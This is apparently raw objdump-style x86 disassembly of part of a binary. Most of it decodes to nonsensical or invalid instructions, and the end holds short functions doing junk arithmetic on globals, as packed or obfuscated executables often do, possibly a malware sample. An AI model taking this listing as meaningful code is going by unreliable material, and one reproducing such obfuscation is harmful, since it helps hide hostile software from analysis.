  40fae8:	rol    BYTE PTR [esi],1
  40faea:	xchg   BYTE PTR [ebx-0x43],bh
  40faed:	hlt    
  40faee:	imul   edx,DWORD PTR [ebx],0x3b
  40faf1:	aam    0xb7
  40faf3:	shl    BYTE PTR [eax+0x73],0xb5
  40faf7:	(bad)  
  40faf8:	fdivr  st,st(6)
  40fafa:	add    DWORD PTR [ebp-0xa],edx
  40fafd:	jg     0x40fa7f
  40faff:	mov    WORD PTR [ebx+ecx*8-0x2f2db63c],fs
  40fb06:	mov    ch,0x39
  40fb08:	or     esp,DWORD PTR ds:0xdb8a2ded
  40fb0e:	lds    eax,FWORD PTR [esi-0x188fef84]
  40fb14:	popa   
  40fb15:	inc    ebx
  40fb16:	sbb    al,0x76
  40fb18:	jmp    0x2921:0xd3dd3ece
  40fb1f:	push   0xffffffcc
  40fb21:	push   cs
  40fb22:	(bad)  
  40fb23:	pop    ecx
  40fb24:	scas   eax,DWORD PTR es:[edi]
  40fb25:	push   edx
  40fb26:	xor    dl,ch
  40fb28:	and    BYTE PTR ds:0xf31f29ad,0x64
  40fb2f:	lahf   
  40fb30:	lea    ebp,[edx+edi*8]
  40fb33:	pop    es
  40fb34:	call   0x87dfa50f
  40fb39:	add    BYTE PTR [edi],ah
  40fb3b:	daa    
  40fb3c:	pop    edi
  40fb3d:	adc    eax,0x67e54325
  40fb42:	(bad)  
  40fb43:	out    0x6d,eax
  40fb45:	rol    DWORD PTR [ecx-0x76a1fe4f],0xe6
  40fb4c:	xchg   ebx,eax
  40fb4d:	mov    ebp,0xb6e2e295
  40fb52:	pop    ebx
  40fb53:	mov    esi,0x5831ba33
  40fb58:	sahf   
  40fb59:	mov    ecx,0x9068248b
  40fb5e:	dec    ebx
  40fb5f:	es test al,0x51
  40fb62:	xchg   edx,eax
  40fb63:	call   0x760dbed9
  40fb68:	sub    DWORD PTR [ecx-0x7],0x4afe4874
  40fb6f:	les    edi,FWORD PTR [esi+eiz*8-0x23e5c858]
  40fb76:	pushf  
  40fb77:	sti    
  40fb78:	and    ecx,DWORD PTR [edi+0x522270aa]
  40fb7e:	pop    esp
  40fb80:	push   0x3ba03ed9
  40fb85:	or     BYTE PTR gs:[edi+0x3777c262],dh
  40fb8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb8d:	icebp  
  40fb8e:	std    
  40fb8f:	mov    WORD PTR [eax],ds
  40fb91:	outs   dx,BYTE PTR ds:[esi]
  40fb92:	retf   
  40fb93:	and    ecx,DWORD PTR ss:[ecx+0x1048f3f]
  40fb9a:	and    al,0x2e
  40fb9c:	sbb    BYTE PTR [ebx],al
  40fb9e:	mov    esp,DWORD PTR [ebx-0x4d]
  40fba1:	fisttp QWORD PTR [edi]
  40fba3:	xchg   BYTE PTR [ecx-0x7],bh
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffff80
  40fbc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbca:	adc    DWORD PTR ds:0x7e7eb6d0,esi
  40fbd0:	jl     0x40fc4f
  40fbd2:	jle    0x40fc52
  40fbd4:	scas   al,BYTE PTR es:[edi]
  40fbd5:	or     ebp,edi
  40fbd7:	scas   al,BYTE PTR es:[edi]
  40fbd8:	xor    ebx,DWORD PTR [esp+esi*8-0x6ef74e2e]
  40fbdf:	mov    ecx,0xc6201476
  40fbe4:	jmp    0x62c54ba9
  40fbe9:	add    DWORD PTR [esp+eax*1],eax
  40fbec:	pop    ebp
  40fbee:	js     0x40fc01
  40fbf0:	ins    DWORD PTR es:[edi],dx
  40fbf1:	fnsave [ecx]
  40fbf3:	push   0x23
  40fbf5:	jo     0x40fc49
  40fbf7:	sbb    dl,bh
  40fbf9:	sub    dh,BYTE PTR [ebx-0x4455ae3e]
  40fbff:	mov    ecx,0x6e13c3cd
  40fc04:	add    al,bl
  40fc06:	(bad)  
  40fc07:	jbe    0x40fba6
  40fc09:	fwait
  40fc0a:	cdq    
  40fc0b:	sub    bl,BYTE PTR [esp+eax*4]
  40fc0e:	imul   esp,DWORD PTR [edi],0xffffffe6
  40fc11:	add    edx,eax
  40fc13:	mov    esp,0x7911b6fd
  40fc18:	ror    DWORD PTR [edi-0x35],cl
  40fc1b:	mov    BYTE PTR es:[edi-0x791f3e98],ah
  40fc22:	mov    WORD PTR [esp+eax*8],ss
  40fc25:	shl    DWORD PTR [ecx+0x183aef4d],0xbc
  40fc2c:	in     eax,0x9a
  40fc2e:	push   edi
  40fc2f:	ss push ss
  40fc31:	icebp  
  40fc32:	rcl    BYTE PTR [esi],1
  40fc34:	dec    eax
  40fc35:	jmp    0x66b6:0x7b011095
  40fc3c:	sti    
  40fc3d:	dec    esp
  40fc3e:	adc    ebp,DWORD PTR [eax-0x17]
  40fc41:	ror    BYTE PTR [ebx],cl
  40fc43:	int    0xf5
  40fc45:	sar    cl,cl
  40fc47:	or     DWORD PTR [edx+0x19],esp
  40fc4a:	frndint 
  40fc4c:	repz test eax,0x26f51e22
  40fc52:	icebp  
  40fc53:	and    BYTE PTR [edi+0xd9f0005],0xf5
  40fc5a:	push   es
  40fc5b:	addr16 mov esi,0xef8fe420
  40fc61:	pop    eax
  40fc62:	push   0xfffffff4
  40fc64:	push   0xffffffab
  40fc66:	cmp    ah,0x1b
  40fc69:	jmp    FWORD PTR [esi-0x17]
  40fc6c:	ins    DWORD PTR es:[edi],dx
  40fc6d:	les    edx,FWORD PTR [edi]
  40fc6f:	adc    al,0xe0
  40fc71:	leave  
  40fc72:	jne    0x40fc6d
  40fc74:	push   ebx
  40fc75:	xor    DWORD PTR [ebp-0x31],edx
  40fc78:	fisttp QWORD PTR [edi]
  40fc7a:	add    al,0xbf
  40fc7c:	add    bl,ch
  40fc7e:	mov    ebp,0x2933d87f
  40fc83:	imul   esp,DWORD PTR ds:0xb7cc9547,0xffffffe7
  40fc8a:	call   0x110af405
  40fc8f:	iret   
  40fc90:	mov    bl,0xc1
  40fc92:	sbb    ecx,DWORD PTR [eax-0x21c1847d]
  40fc98:	inc    ecx
  40fc99:	or     DWORD PTR [ecx-0x20],ecx
  40fc9c:	enter  0x8198,0x38
  40fca0:	add    BYTE PTR [ecx-0x80],0x14
  40fca4:	sbb    dl,BYTE PTR [eax]
  40fca6:	or     bl,bh
  40fca8:	call   0x2876cadc
  40fcad:	mov    ecx,0xc442316d
  40fcb2:	mov    dl,BYTE PTR [ebp+0x6ce97d37]
  40fcb8:	sbb    al,0xca
  40fcba:	fidivr WORD PTR [ebx-0x55]
  40fcbd:	mov    eax,0x82f6ee09
  40fcc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcc3:	rol    BYTE PTR [eax+0x38],1
  40fcc6:	jp     0x40fcea
  40fcc8:	neg    dl
  40fcca:	or     ah,bh
  40fccc:	lahf   
  40fccd:	mov    ds:0x90dc5ee7,eax
  40fcd2:	mov    esp,0x479b5b13
  40fcd7:	xchg   ecx,eax
  40fcd8:	lods   eax,DWORD PTR ds:[esi]
  40fcd9:	or     DWORD PTR [ecx+0x45f33b20],0xfffffff5
  40fce0:	mov    es,WORD PTR [ebx-0x4]
  40fce3:	outs   dx,BYTE PTR ds:[esi]
  40fce4:	sti    
  40fce5:	daa    
  40fce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce7:	test   eax,0xf8fdafda
  40fcec:	sub    BYTE PTR [eax+0x51],0x50
  40fcf0:	push   ds
  40fcf1:	imul   ebx,DWORD PTR [ebx],0xffffffb6
  40fcf4:	arpl   WORD PTR [ebp+0x3d],si
  40fcf7:	cmp    eax,0x21a2dfcd
  40fcfc:	cdq    
  40fcfd:	rcl    bl,0x4b
  40fd00:	fsub   QWORD PTR [esi-0x29]
  40fd03:	mov    ecx,0x8c0e3ec2
  40fd08:	mov    al,0xc9
  40fd0a:	rcl    DWORD PTR [ebx+0x1a],cl
  40fd0d:	xor    al,0x12
  40fd0f:	cwde   
  40fd10:	add    ah,BYTE PTR [edi-0x5a7984f]
  40fd16:	jl     0x40fcb1
  40fd18:	ins    BYTE PTR es:[edi],dx
  40fd19:	pop    esi
  40fd1a:	outs   dx,BYTE PTR ds:[esi]
  40fd1b:	jle    0x40fca4
  40fd1d:	sub    BYTE PTR [edi+0x4e],ch
  40fd20:	add    al,0x70
  40fd22:	inc    ebx
  40fd23:	out    0x27,al
  40fd25:	cs popf 
  40fd27:	cmc    
  40fd28:	hlt    
  40fd29:	inc    edi
  40fd2a:	lods   eax,DWORD PTR ds:[esi]
  40fd2b:	sub    al,0xf3
  40fd2d:	cdq    
  40fd2e:	cmp    edx,DWORD PTR [edi]
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	(bad)  
  40fd32:	sbb    eax,0x4b50ac03
  40fd37:	add    ebp,DWORD PTR [ebp-0x3fa2bd61]
  40fd3d:	push   0xffffff92
  40fd3f:	or     bh,BYTE PTR [eax+0x2fccf897]
  40fd45:	fcmovbe st,st(1)
  40fd47:	ficom  DWORD PTR [edi+0x4bf23ba2]
  40fd4d:	mov    edx,0xd609d86
  40fd52:	add    ecx,esi
  40fd54:	scas   al,BYTE PTR es:[edi]
  40fd55:	push   cs
  40fd56:	dec    ebx
  40fd57:	(bad)  
  40fd58:	cmp    eax,0xb797f510
  40fd5d:	out    0x4e,al
  40fd5f:	enter  0xae21,0x62
  40fd63:	jnp    0x40fdab
  40fd65:	dec    esi
  40fd66:	out    0x26,al
  40fd68:	adc    dl,BYTE PTR [ebp+ebp*8+0x1377ee6d]
  40fd6f:	shr    BYTE PTR [edx+ecx*4-0x11],1
  40fd73:	adc    DWORD PTR [esi],0x617b359e
  40fd79:	cmp    DWORD PTR [edi+0x7c97aa47],eax
  40fd7f:	mov    cl,cl
  40fd81:	bnd jb 0x40fd98
  40fd84:	xchg   ecx,eax
  40fd85:	stos   BYTE PTR es:[edi],al
  40fd86:	fcomp  DWORD PTR [esi-0x75cb0da6]
  40fd8c:	sbb    al,0x90
  40fd8e:	or     BYTE PTR [eax+0x69],0xd3
  40fd92:	and    cl,bl
  40fd94:	dec    edi
  40fd95:	dec    edx
  40fd96:	arpl   WORD PTR [ebx],bp
  40fd98:	leave  
  40fd99:	mov    ds:0xdd53c52e,eax
  40fd9e:	loope  0x40fd9a
  40fda0:	cwde   
  40fda1:	fcmove st,st(1)
  40fda3:	es adc edi,edx
  40fda6:	rcl    BYTE PTR [ecx-0x33e4aa34],1
  40fdac:	jmp    0x370b:0x2b67b464
  40fdb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdb4:	mov    BYTE PTR [ebx+0x27dbc613],ah
  40fdba:	jno    0x40fd89
  40fdbc:	imul   edx,DWORD PTR [eax+edx*8-0x59],0x9
  40fdc1:	and    BYTE PTR [edx-0x74],ah
  40fdc4:	and    bh,bl
  40fdc6:	jno    0x40fdfe
  40fdc8:	shl    BYTE PTR [edi-0x2b0878f2],1
  40fdce:	sbb    BYTE PTR [esp+ecx*4-0x12],bl
  40fdd2:	mov    ebp,0xb16e8c29
  40fdd7:	adc    DWORD PTR [edx+0x264b9635],ecx
  40fddd:	adc    al,0x94
  40fddf:	mov    al,ds:0xbba746bb
  40fde4:	loope  0x40fe07
  40fde6:	push   ebp
  40fde7:	fld    QWORD PTR [edi-0x24]
  40fdea:	test   al,ch
  40fdec:	xchg   DWORD PTR [ecx-0x3d],edx
  40fdef:	cdq    
  40fdf0:	xor    DWORD PTR [ebx],ebx
  40fdf2:	mov    ch,0x13
  40fdf4:	loop   0x40fd8b
  40fdf6:	out    0x81,al
  40fdf8:	out    dx,al
  40fdf9:	sbb    ebp,DWORD PTR [ebx]
  40fdfb:	dec    ecx
  40fdfc:	cmc    
  40fdfd:	sub    dl,BYTE PTR [ecx]
  40fdff:	retf   
  40fe00:	fidiv  WORD PTR [ecx]
  40fe02:	dec    ebx
  40fe03:	ss pop ss
  40fe05:	in     al,0x8d
  40fe07:	pushf  
  40fe08:	scas   al,BYTE PTR es:[edi]
  40fe09:	xchg   ecx,edi
  40fe0b:	mov    bh,0xd1
  40fe0d:	push   eax
  40fe0e:	push   edi
  40fe0f:	test   DWORD PTR [edx-0x534c2584],edx
  40fe15:	dec    ecx
  40fe16:	mov    eax,0x2ee86802
  40fe1b:	inc    eax
  40fe1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe1d:	add    eax,0x2d985f3b
  40fe22:	sahf   
  40fe23:	stc    
  40fe24:	popf   
  40fe25:	xchg   ebx,eax
  40fe26:	xchg   ebx,eax
  40fe27:	dec    esi
  40fe28:	loopne 0x40fea0
  40fe2a:	jae    0x40fe4b
  40fe2c:	sub    dl,BYTE PTR [eax-0x58704002]
  40fe32:	and    eax,0x6d59038c
  40fe37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe38:	scas   al,BYTE PTR es:[edi]
  40fe39:	fs sbb edx,esp
  40fe3c:	push   ebx
  40fe3d:	out    dx,eax
  40fe3e:	dec    eax
  40fe3f:	xchg   edi,eax
  40fe40:	jne    0x40fe28
  40fe42:	iret   
  40fe43:	inc    esp
  40fe44:	sti    
  40fe45:	jbe    0x40fe70
  40fe47:	xchg   ebp,eax
  40fe48:	outs   dx,BYTE PTR ds:[esi]
  40fe49:	xchg   BYTE PTR [edi+ebx*1+0x3d],dl
  40fe4d:	pop    ebx
  40fe4e:	shr    DWORD PTR [eax+0x5cb14ec0],cl
  40fe54:	mov    eax,ds:0xc95865e9
  40fe59:	sub    al,0x4a
  40fe5b:	push   ebp
  40fe5c:	out    dx,al
  40fe5d:	adc    al,0xbb
  40fe5f:	or     ebx,ebp
  40fe61:	dec    edi
  40fe62:	jg     0x40feaf
  40fe64:	pushf  
  40fe65:	(bad)  
  40fe66:	sbb    edx,DWORD PTR [esp+ebx*4]
  40fe69:	test   esi,esi
  40fe6b:	dec    ebp
  40fe6c:	mov    ds:0xa1bc8079,al
  40fe71:	dec    ebx
  40fe72:	jmp    0xe08d7cb
  40fe77:	add    BYTE PTR [edi+0x64f9fb80],cl
  40fe7d:	sahf   
  40fe7e:	stos   DWORD PTR es:[edi],eax
  40fe7f:	add    ecx,ebx
  40fe81:	ret    0xefc8
  40fe84:	xchg   DWORD PTR [eax],eax
  40fe86:	push   0x29
  40fe88:	and    eax,0xd1d02b67
  40fe8d:	push   ecx
  40fe8e:	shl    BYTE PTR [ebp-0x3f2ff25f],cl
  40fe94:	lods   al,BYTE PTR ds:[esi]
  40fe95:	mov    ds:0x9e1a4fbe,al
  40fe9a:	out    dx,eax
  40fe9b:	loop   0x40fe7a
  40fe9d:	loopne 0x40feea
  40fe9f:	sbb    edx,0xffffff8f
  40fea2:	jno    0x40fee0
  40fea4:	xor    dh,BYTE PTR [ebp+0xfb3f406]
  40feaa:	jge    0x40feb1
  40feac:	pop    ebx
  40fead:	and    eax,0x21446533
  40feb2:	and    esi,DWORD PTR [esi-0x200850a1]
  40feb8:	sbb    DWORD PTR [edi],eax
  40feba:	ret    
  40febb:	sub    DWORD PTR [edx],esi
  40febd:	cs xchg ecx,eax
  40febf:	mov    eax,0xe273cc6f
  40fec4:	inc    ebx
  40fec5:	scas   eax,DWORD PTR es:[edi]
  40fec6:	jecxz  0x40fe7b
  40fec8:	into   
  40fec9:	adc    ch,BYTE PTR [edi+0x28]
  40fecc:	imul   esp,esi,0x67ba87d
  40fed2:	add    al,0x39
  40fed4:	scas   al,BYTE PTR es:[edi]
  40fed5:	aam    0x8b
  40fed7:	inc    ebp
  40fed8:	or     al,0x33
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x114e4346
  40fef3:	in     eax,dx
  40fef4:	fidiv  WORD PTR [di+0x7e7e]
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	in     al,dx
  40fefe:	or     BYTE PTR [ebp+eax*2-0x37827200],ch
  40ff05:	popf   
  40ff06:	jg     0x40ff35
  40ff08:	adc    eax,0x98016711
  40ff0d:	jb     0x40ff6f
  40ff0f:	jle    0x40fe9d
  40ff11:	and    al,BYTE PTR [ebx]
  40ff13:	imul   eax,DWORD PTR [edx+0x53],0x8ffd6360
  40ff1a:	cmp    cl,BYTE PTR [eax-0x68]
  40ff1d:	xchg   esp,eax
  40ff1e:	sub    esp,DWORD PTR [edi+0x39]
  40ff21:	mov    edi,0xb424c5a1
  40ff26:	ret    0xe867
  40ff29:	dec    eax
  40ff2a:	pop    es
  40ff2b:	sub    al,0x1d
  40ff2d:	gs loope 0x40feea
  40ff30:	aad    0xe2
  40ff32:	jp     0x40ff34
  40ff34:	cwde   
  40ff35:	push   edi
  40ff36:	add    ebx,DWORD PTR [ebp-0x7e]
  40ff39:	pop    ss
  40ff3a:	cli    
  40ff3b:	pop    esi
  40ff3c:	cmp    DWORD PTR [eax+0x5ab1df4f],0xfffffff8
  40ff43:	ss loop 0x40ff73
  40ff46:	mov    BYTE PTR [ecx],dl
  40ff48:	xchg   ecx,eax
  40ff49:	inc    edi
  40ff4a:	cmc    
  40ff4b:	push   ss
  40ff4c:	call   0xa7dcf5fc
  40ff51:	gs out 0xe5,al
  40ff54:	pop    ecx
  40ff55:	loop   0x40ffae
  40ff57:	lods   al,BYTE PTR ds:[esi]
  40ff58:	dec    ebx
  40ff59:	scas   al,BYTE PTR es:[edi]
  40ff5a:	and    esi,ebx
  40ff5c:	dec    eax
  40ff5d:	out    0xbf,al
  40ff5f:	shr    DWORD PTR [ebx],cl
  40ff61:	sbb    al,0x71
  40ff63:	sbb    cl,BYTE PTR [edx+eax*4+0x5f374c3b]
  40ff6a:	cmp    al,0x34
  40ff6c:	jl     0x40ff65
  40ff6e:	jbe    0x40ff6d
  40ff70:	inc    edx
  40ff71:	std    
  40ff72:	add    esi,DWORD PTR fs:[edi]
  40ff75:	cmp    al,BYTE PTR es:[ebx]
  40ff78:	rcr    DWORD PTR [ebp+0x73076110],0x13
  40ff7f:	sbb    DWORD PTR [eax+0x3d],edi
  40ff82:	inc    ebx
  40ff83:	push   ecx
  40ff84:	dec    ecx
  40ff85:	bound  ebx,QWORD PTR [eax]
  40ff87:	mov    ds:0x737c7c48,al
  40ff8c:	mov    esp,0xcdb56bf0
  40ff91:	jmp    0x924ee41d
  40ff96:	pop    esi
  40ff97:	mov    esi,0xc93db043
  40ff9c:	lods   al,BYTE PTR ds:[esi]
  40ff9d:	mov    ch,0xd6
  40ff9f:	sbb    edx,DWORD PTR [edx+0x5]
  40ffa2:	cdq    
  40ffa3:	sbb    BYTE PTR [edx+0x612d6493],al
  40ffa9:	out    dx,al
  40ffaa:	adc    edi,DWORD PTR [eax]
  40ffac:	outs   dx,BYTE PTR ds:[esi]
  40ffad:	pop    ecx
  40ffae:	xor    eax,0x84b1e775
  40ffb3:	out    0x71,al
  40ffb5:	and    BYTE PTR [edi],al
  40ffb7:	push   esp
  40ffb8:	inc    esp
  40ffb9:	dec    edi
  40ffba:	jb     0x410039
  40ffbc:	dec    esi
  40ffbd:	loop   0x40ff4a
  40ffbf:	push   esp
  40ffc0:	dec    eax
  40ffc1:	or     ah,BYTE PTR [edx+0x360648b5]
  40ffc7:	cld    
  40ffc8:	cli    
  40ffc9:	shr    DWORD PTR [ebp-0x31a52e8d],0xe6
  40ffd0:	mov    BYTE PTR [edx+0x63],ah
  40ffd3:	ret    
  40ffd4:	add    DWORD PTR ds:0xc93751bc,esi
  40ffda:	(bad)  
  40ffdb:	xchg   esi,eax
  40ffdc:	outs   dx,DWORD PTR ds:[esi]
  40ffdd:	mov    eax,0x1274f247
  40ffe2:	push   es
  40ffe3:	fdiv   st,st(0)
  40ffe5:	jg     0x40ffc0
  40ffe7:	mov    ebx,0x41a1e5f2
  40ffec:	mov    ebp,0x202922fa
  40fff1:	(bad)  
  40fff2:	push   edx
  40fff3:	mov    al,0xf9
  40fff5:	jmp    0x40ffe3
  40fff7:	adc    al,0xfd
  40fff9:	sub    bh,BYTE PTR [edi]
  40fffb:	repz xor ebx,DWORD PTR [eax]
  40fffe:	inc    esi
  40ffff:	ds fwait
  410001:	jg     0x41002f
  410003:	idiv   DWORD PTR [esi+0x319576a0]
  410009:	sar    DWORD PTR [ecx],1
  41000b:	adc    al,0x30
  41000d:	je     0x40ffa3
  41000f:	xor    al,0xb4
  410011:	stos   BYTE PTR es:[edi],al
  410012:	inc    eax
  410013:	sbb    eax,0x4b6f2fb4
  410018:	imul   DWORD PTR [eax]
  41001a:	jnp    0x40ffe5
  41001c:	adc    eax,0x34bd10f9
  410021:	retf   
  410022:	fst    QWORD PTR [ebp-0x6c]
  410025:	jl     0x41007c
  410027:	jbe    0x41007a
  410029:	xlat   BYTE PTR ds:[ebx]
  41002a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41002b:	push   ebp
  41002c:	outs   dx,DWORD PTR ds:[esi]
  41002d:	xchg   ebp,eax
  41002e:	mov    ds:0x54f5916b,eax
  410033:	pop    ds
  410034:	jns    0x386ec8f4
  41003a:	dec    edx
  41003b:	jmp    0xcca9:0xec990ea0
  410042:	ret    0x65d1
  410045:	mov    bl,0x11
  410047:	mov    ecx,0x816f362e
  41004c:	imul   edi,DWORD PTR [esi+ebp*4+0x15],0xec78fff5
  410054:	pop    esi
  410055:	mov    WORD PTR [ebp-0x6a9a0f67],?
  41005b:	pop    ebp
  41005c:	cmp    BYTE PTR [bp+0x29],al
  410060:	mov    ?,WORD PTR [eax+ebp*8+0x5f]
  410064:	add    dh,bl
  410066:	dec    ecx
  410067:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410069:	test   eax,0xbfd572a2
  41006e:	adc    eax,0x44990f16
  410073:	push   ebx
  410074:	dec    ebx
  410075:	retf   
  410076:	push   ecx
  410077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410078:	sub    eax,0xba5b34f9
  41007d:	je     0x410046
  41007f:	or     eax,0x9d7f78ad
  410084:	pop    esi
  410085:	not    DWORD PTR [ebx-0x26]
  410088:	je     0x410014
  41008a:	sub    dh,dh
  41008c:	inc    ebx
  41008d:	add    dh,BYTE PTR [ebp-0x12]
  410090:	(bad)  
  410091:	xlat   BYTE PTR ds:[ebx]
  410092:	sar    DWORD PTR [ebp+ecx*8+0x15],0x4d
  410097:	dec    ecx
  410098:	js     0x410068
  41009a:	sub    bl,cl
  41009c:	dec    edi
  41009d:	add    eax,0xed64a8b2
  4100a2:	mov    ?,edi
  4100a4:	jo     0x4100db
  4100a6:	pushf  
  4100a7:	mov    ch,0x17
  4100a9:	gs ret 0xc25b
  4100ad:	cdq    
  4100ae:	add    eax,0xa8c499a4
  4100b3:	popf   
  4100b4:	rcl    DWORD PTR [ecx-0x55],0xe3
  4100b8:	push   eax
  4100b9:	or     dl,BYTE PTR [edx+0x14]
  4100bc:	outs   dx,BYTE PTR ds:[esi]
  4100bd:	and    ecx,DWORD PTR [ecx+0x7e421018]
  4100c3:	(bad)  [esi-0x6bb07a3e]
  4100c9:	es cmp al,0x1f
  4100cc:	ja     0x41007f
  4100ce:	fsub   st,st(5)
  4100d0:	jae    0x410088
  4100d2:	sub    DWORD PTR [ecx],0x33f11217
  4100d8:	mov    fs,WORD PTR [edi+0xd]
  4100db:	ror    DWORD PTR [eax],0xf6
  4100de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100df:	outs   dx,BYTE PTR ds:[esi]
  4100e0:	daa    
  4100e1:	pop    edx
  4100e2:	lods   al,BYTE PTR ds:[esi]
  4100e3:	(bad)  
  4100e4:	rol    edx,cl
  4100e6:	cmp    dl,bl
  4100e8:	fwait
  4100e9:	std    
  4100ea:	pop    esi
  4100eb:	mov    bh,0xd3
  4100ed:	fldenv [eax+ecx*1]
  4100f0:	inc    ebx
  4100f1:	inc    esi
  4100f2:	rcl    DWORD PTR [edx+0x75f6729a],cl
  4100f8:	adc    esi,DWORD PTR [ebx+ebx*4+0x5b]
  4100fc:	inc    eax
  4100fd:	xchg   DWORD PTR [ebx],esi
  4100ff:	pop    esp
  410100:	jmp    0x4100ea
  410102:	dec    edi
  410103:	inc    esi
  410104:	and    DWORD PTR [eax],esi
  410106:	and    ecx,DWORD PTR [ecx-0x59]
  410109:	adc    BYTE PTR [eax-0x5a3e54d4],bl
  41010f:	pop    ds
  410110:	repz push edi
  410112:	adc    al,0x9a
  410114:	sahf   
  410115:	pop    edx
  410116:	push   ebp
  410117:	bound  eax,QWORD PTR [edi-0x2a]
  41011a:	fcomp  DWORD PTR [ecx+0xf]
  41011d:	pop    ds
  41011e:	aas    
  41011f:	push   edi
  410120:	xchg   DWORD PTR [ebx+0x11e1d9ec],eax
  410126:	push   eax
  410127:	cmp    ebx,esp
  410129:	or     DWORD PTR [ecx+0x452b3b34],ebp
  41012f:	pop    edx
  410130:	ucomiss xmm5,xmm4
  410133:	fild   QWORD PTR [ebx]
  410135:	cmc    
  410136:	retf   
  410137:	adc    ecx,DWORD PTR [ebx+edx*8]
  41013a:	pop    edi
  41013b:	(bad)  
  41013c:	and    al,0x8
  41013e:	and    DWORD PTR ds:0x26748b78,esi
  410144:	jns    0x4100db
  410146:	adc    eax,0xf007473f
  41014b:	push   eax
  41014c:	mov    ecx,ecx
  41014e:	arpl   sp,di
  410150:	xchg   esi,eax
  410151:	mov    ch,BYTE PTR [esi]
  410153:	sti    
  410154:	jg     0x410109
  410156:	leave  
  410157:	sbb    ebx,DWORD PTR [ebp+0x5a]
  41015a:	ss shl dh,cl
  41015d:	mov    esi,0x17d41ef3
  410162:	div    DWORD PTR [ebx]
  410164:	and    BYTE PTR [esi-0x527987c],dl
  41016a:	ja     0x410114
  41016c:	fistp  WORD PTR [esi]
  41016e:	cwde   
  41016f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410170:	jg     0x4101d0
  410172:	sbb    al,ah
  410174:	xor    BYTE PTR [esi+eiz*8-0x69],0x29
  410179:	ja     0x4101b6
  41017b:	mov    edx,0x7d8504f9
  410180:	or     DWORD PTR [edi+ebx*2-0x534f3004],0xffffff87
  410188:	push   edi
  410189:	jns    0x410171
  41018b:	stc    
  41018c:	xchg   DWORD PTR [eax],ebp
  41018e:	xor    al,0x61
  410190:	dec    esi
  410191:	out    0xde,al
  410193:	gs stc 
  410195:	mov    ecx,0xa1a28bf0
  41019a:	outs   dx,BYTE PTR ds:[esi]
  41019b:	fdiv   QWORD PTR gs:[eax+0x67]
  41019f:	iret   
  4101a0:	aam    0xc7
  4101a2:	adc    bh,ch
  4101a4:	sub    DWORD PTR [esi+0x7e],ecx
  4101a7:	pop    ecx
  4101a8:	repnz scas eax,DWORD PTR es:[edi]
  4101aa:	into   
  4101ab:	sar    BYTE PTR [esi-0x6f4a3599],1
  4101b1:	adc    eax,0x2871b098
  4101b6:	cld    
  4101b7:	jle    0x4101cc
  4101b9:	retf   0x1124
  4101bc:	das    
  4101bd:	std    
  4101be:	pop    ebx
  4101bf:	xor    ah,cl
  4101c1:	aam    0x78
  4101c3:	call   0x79aa223c
  4101c8:	shl    BYTE PTR [ebx+0x607d8332],0xda
  4101cf:	leave  
  4101d0:	pop    ebx
  4101d1:	sub    al,0xc7
  4101d3:	adc    cl,BYTE PTR [ebx]
  4101d5:	push   esi
  4101d6:	sti    
  4101d7:	push   0x49
  4101d9:	jmp    0xb8805d37
  4101de:	dec    ebp
  4101df:	std    
  4101e0:	or     BYTE PTR [ebx],dl
  4101e2:	add    bh,BYTE PTR [ebx+0x38]
  4101e5:	fadd   DWORD PTR [ebp+0x69]
  4101e8:	mov    dl,0x8f
  4101ea:	(bad)  
  4101eb:	jmp    0x8458:0xac8e881d
  4101f2:	dec    ecx
  4101f3:	test   al,0xdd
  4101f5:	dec    ecx
  4101f6:	push   cs
  4101f7:	je     0x4101c8
  4101f9:	int    0xa8
  4101fb:	mov    ch,al
  4101fd:	neg    BYTE PTR [edx-0x9]
  410200:	icebp  
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43371f
  41021e:	adc    DWORD PTR ds:0x433757,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43368b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4337ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43375f
  41026b:	or     DWORD PTR ds:0x433757,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43372b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43372b
  41028a:	inc    ecx
